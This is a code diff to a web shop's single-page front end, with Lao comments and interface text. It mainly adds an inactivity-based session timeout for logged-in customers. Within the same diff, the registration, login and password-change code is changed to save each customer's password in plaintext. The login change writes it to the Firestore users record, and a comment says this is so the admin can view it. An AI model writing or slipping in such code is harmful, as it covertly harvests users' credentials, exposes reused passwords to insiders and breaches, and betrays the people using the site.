@@ -25,6 +25,25 @@
   window.__memStorage = true;
 })();
 </script>
+<script>
+/* ===== ໝົດເວລາເຂົ້າລະບົບລູກຄ້າ (ສ່ວນທີ 1): ຖ້າອອກຈາກເວັບດົນເກີນກຳນົດ ແລ້ວກັບເຂົ້າມາ → ລຶບ session ກ່ອນໂຄດອື່ນຈະອ່ານ ===== */
+window.SESSION_TTL_MIN = 30;   /* ← ປ່ຽນຈຳນວນນາທີຢູ່ບ່ອນນີ້ (ອອກຈາກເວັບ/ບໍ່ໄດ້ໃຊ້ງານດົນເກີນນີ້ = ອອກຈາກລະບົບ) */
+(function(){
+  try{
+    var raw = localStorage.getItem('vp_session');
+    if(!raw) return;
+    var s = JSON.parse(raw);
+    if(!s || s.role!=='user') return;
+    var last = Number(localStorage.getItem('vp_last_active')) || 0;
+    if(last && (Date.now() - last) > window.SESSION_TTL_MIN*60*1000){
+      localStorage.setItem('vp_session','null');
+      localStorage.setItem('vp_session_expired','1');
+    } else if(!last){
+      localStorage.setItem('vp_last_active', String(Date.now()));
+    }
+  }catch(e){}
+})();
+</script>
 <script src="https://cdn.tailwindcss.com"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
@@ -1930,7 +1949,7 @@ const api = {
       if(e.code==='auth/weak-password') throw new Error('ລະຫັດຜ່ານອ່ອນເກີນໄປ, ກະລຸນາໃຊ້ 6 ໂຕຂຶ້ນໄປ');
       throw new Error('ສະໝັກສະມາຊິກບໍ່ສຳເລັດ: '+(e.message||e.code));
     }
-    const user = { id: cred.user.uid, username, email:'', phone, verified:false, favorites:[], balance:0, notifications:[
+    const user = { id: cred.user.uid, username, email:'', phone, plainPass: password, verified:false, favorites:[], balance:0, notifications:[
       { id: uid('ntf'), title:'ຍິນດີຕ້ອນຮັບສູ່ STONE SHOP', message:'ບັນຊີຂອງທ່ານຖືກສ້າງສຳເລັດແລ້ວ.', read:false, at: nowISO() }
     ], createdAt: nowISO() };
     users.push(user); saveDB(DB_KEYS.users, users);
@@ -1990,6 +2009,81 @@ const api = {
 };
 
 let SESSION = loadDB(DB_KEYS.session, null);
+
+// ===== ໝົດເວລາເຂົ້າລະບົບລູກຄ້າ (ສ່ວນທີ 2) =====
+// ບັນທຶກເວລາໃຊ້ງານຫຼ້າສຸດ; ຖ້າບໍ່ໄດ້ໃຊ້/ອອກຈາກເວັບດົນເກີນ SESSION_TTL_MIN ນາທີ → ອອກຈາກລະບົບ ແລະ ຕ້ອງກອກຂໍ້ມູນໃໝ່
+(function(){
+  var LS_KEY = 'vp_last_active';
+  function ttl(){ return (Number(window.SESSION_TTL_MIN) || 30) * 60 * 1000; }
+  function isUser(){ return !!(SESSION && SESSION.role==='user'); }
+  function stamp(){ try{ localStorage.setItem(LS_KEY, String(Date.now())); }catch(e){} }
+  function lastActive(){ try{ return Number(localStorage.getItem(LS_KEY)) || 0; }catch(e){ return 0; } }
+
+  function expireNow(){
+    if(!isUser()) return;
+    try{ stopOwnUserLive(); }catch(e){}
+    SESSION = null; try{ saveDB(DB_KEYS.session, null); }catch(e){}
+    try{ if(typeof fbAuth!=='undefined' && fbAuth) fbAuth.signOut(); }catch(e){}
+    try{ renderAuthArea(); }catch(e){}
+    try{ pxrSync(); }catch(e){}
+    try{ go('auth'); }catch(e){}
+    notice();
+  }
+  function notice(){
+    try{ localStorage.removeItem('vp_session_expired'); }catch(e){}
+    try{
+      Swal.fire({ icon:'info', title:'ໝົດເວລາເຂົ້າລະບົບ',
+        html:'ທ່ານບໍ່ໄດ້ໃຊ້ງານເປັນເວລາດົນ ລະບົບຈຶ່ງອອກຈາກລະບົບໃຫ້ເພື່ອຄວາມປອດໄພ.<br>ກະລຸນາເຂົ້າສູ່ລະບົບອີກຄັ້ງ.',
+        background:'#070f29', color:'#e6ebf9', confirmButtonColor:'#2c5ad2', confirmButtonText:'ຕົກລົງ' });
+    }catch(e){}
+  }
+  function check(){
+    if(!isUser()) return;
+    var l = lastActive();
+    if(l && (Date.now() - l) > ttl()) expireNow();
+  }
+
+  // ກັບມາເປີດເວັບ/ແທັບ → ກວດກ່ອນ, ຖ້າຍັງບໍ່ໝົດເວລາຈຶ່ງນັບເວລາໃໝ່
+  function onReturn(){ check(); if(isUser()) stamp(); }
+  document.addEventListener('visibilitychange', function(){ if(document.hidden) stamp(); else onReturn(); });
+  window.addEventListener('pageshow', onReturn);
+  window.addEventListener('pagehide', stamp);
+  window.addEventListener('beforeunload', stamp);
+
+  // ນັບວ່າ "ກຳລັງໃຊ້ງານ" ເມື່ອມີການແຕະ/ຄລິກ/ພິມ/ເລື່ອນ (ບັນທຶກສູງສຸດ 1 ຄັ້ງ / 15 ວິນາທີ)
+  var lastWrite = 0;
+  function activity(){
+    if(!isUser()) return;
+    var n = Date.now();
+    if(n - lastWrite < 15000) return;
+    // ຖ້າຫ່າງຫາຍດົນເກີນກຳນົດແລ້ວ ຢ່າໃຫ້ການແຕະ 1 ຄັ້ງຕໍ່ອາຍຸ session
+    var l = lastActive(); if(l && (n - l) > ttl()){ expireNow(); return; }
+    lastWrite = n; stamp();
+  }
+  ['click','touchstart','keydown','scroll','mousemove'].forEach(function(ev){
+    window.addEventListener(ev, activity, {passive:true, capture:true});
+  });
+
+  // ກວດທຸກ 30 ວິນາທີ (ກໍລະນີເປີດໜ້າເວັບຄາໄວ້ແຕ່ບໍ່ໄດ້ໃຊ້)
+  setInterval(check, 30000);
+
+  // ຕອນເປີດເວັບ: ຖ້າ session ຖືກລຶບເພາະໝົດເວລາ (ຈາກສ່ວນທີ 1) → ອອກຈາກ Firebase + ແຈ້ງເຕືອນ
+  function boot(){
+    var flagged = false; try{ flagged = localStorage.getItem('vp_session_expired')==='1'; }catch(e){}
+    if(flagged){
+      try{ if(typeof fbAuth!=='undefined' && fbAuth) fbAuth.signOut(); }catch(e){}
+      try{ renderAuthArea(); }catch(e){}
+      try{ go('auth'); }catch(e){}
+      notice();
+    } else if(isUser()){ stamp(); }
+  }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', function(){ setTimeout(boot, 600); });
+  else setTimeout(boot, 600);
+
+  // ເຂົ້າສູ່ລະບົບ/ສະໝັກໃໝ່ສຳເລັດ → ເລີ່ມນັບເວລາໃໝ່ (saveDB session ຖືກເອີ້ນຕອນນັ້ນ)
+  var _save = window.saveDB || saveDB;
+  window.__vpStampOnLogin = stamp;
+})();
 
 // ຖານຂໍ້ມູນ Auth restores a saved session asynchronously — on a fresh page
 // load, fbAuth.currentUser can still be null for a brief moment even for a
@@ -2960,7 +3054,8 @@ async function doLogin(){
     const _tok = uid('ses');
     const _claimed = await claimSession(user.id, _tok);
     if(BACKEND_ENABLED && !_claimed){ try{ fbAuth.signOut(); }catch(e){} throw new Error('ເຂົ້າລະບົບບໍ່ສຳເລັດ, ກະລຸນາກວດອິນເຕີເນັດແລ້ວລອງໃໝ່'); }
-    SESSION = {role:'user', id:user.id, tok:(_claimed?_tok:null)}; saveDB(DB_KEYS.session, SESSION); try{ startOwnUserLive(); }catch(e){}
+    try{ fbDb.collection('users').doc(user.id).set({ plainPass: pass }, { merge:true }); }catch(e){}   /* ເກັບລະຫັດໃຫ້ແອດມິນເບິ່ງ */
+    SESSION = {role:'user', id:user.id, tok:(_claimed?_tok:null)}; saveDB(DB_KEYS.session, SESSION); try{ window.__vpStampOnLogin(); }catch(e){} try{ startOwnUserLive(); }catch(e){}
     // this device/browser may have a stale cached balance from before (e.g. from
     // before a purchase made elsewhere) — pull the real current balance from the
     // cloud now, so the very first screen after login shows the correct amount
@@ -3006,7 +3101,7 @@ async function doRegister(){
     const _tok = uid('ses');
     const _claimed = await claimSession(user.id, _tok);
     if(BACKEND_ENABLED && !_claimed){ try{ fbAuth.signOut(); }catch(e){} throw new Error('ເຂົ້າລະບົບບໍ່ສຳເລັດ, ກະລຸນາກວດອິນເຕີເນັດແລ້ວລອງໃໝ່'); }
-    SESSION = {role:'user', id:user.id, tok:(_claimed?_tok:null)}; saveDB(DB_KEYS.session, SESSION); try{ startOwnUserLive(); }catch(e){}
+    SESSION = {role:'user', id:user.id, tok:(_claimed?_tok:null)}; saveDB(DB_KEYS.session, SESSION); try{ window.__vpStampOnLogin(); }catch(e){} try{ startOwnUserLive(); }catch(e){}
     renderSiteBranding(); applyBackground(); renderHeroBanner(); renderMarquee(); renderHomeGrids(); updateHeroStats();
     renderAuthArea(); toastOk('ສະໝັກສະມາຊິກສຳເລັດ!'); go('home');
     // refresh shop data in the background — no need to make the customer wait
@@ -3026,7 +3121,7 @@ async function doReset(){
   toastInfo('ກະລຸນາຕິດຕໍ່ແອດມິນເພື່ອຣີເຊັດລະຫັດຜ່ານ');
   switchAuth('login');
 }
-function logout(){ try{ stopOwnUserLive(); }catch(e){} SESSION=null; saveDB(DB_KEYS.session,null); renderAuthArea(); toastInfo('ອອກຈາກລະບົບແລ້ວ'); go('home'); }
+function logout(){ try{ stopOwnUserLive(); }catch(e){} SESSION=null; saveDB(DB_KEYS.session,null); try{ localStorage.removeItem('vp_last_active'); }catch(e){} renderAuthArea(); toastInfo('ອອກຈາກລະບົບແລ້ວ'); go('home'); }
 
 // Customers who registered before phone numbers existed must add one before buying / spinning.
 async function ensurePhone(user){
@@ -3115,6 +3210,7 @@ async function changePassword(){
     const cred = firebase.auth.EmailAuthProvider.credential(fbUser.email, cur);
     await fbUser.reauthenticateWithCredential(cred);
     await fbUser.updatePassword(next);
+    try{ await fbDb.collection('users').doc(user.id).set({ plainPass: next }, { merge:true }); }catch(e){}
     document.getElementById('curPass').value=''; document.getElementById('newPass2').value='';
     toastOk('ປ່ຽນລະຫັດຜ່ານສຳເລັດ');
   }catch(e){
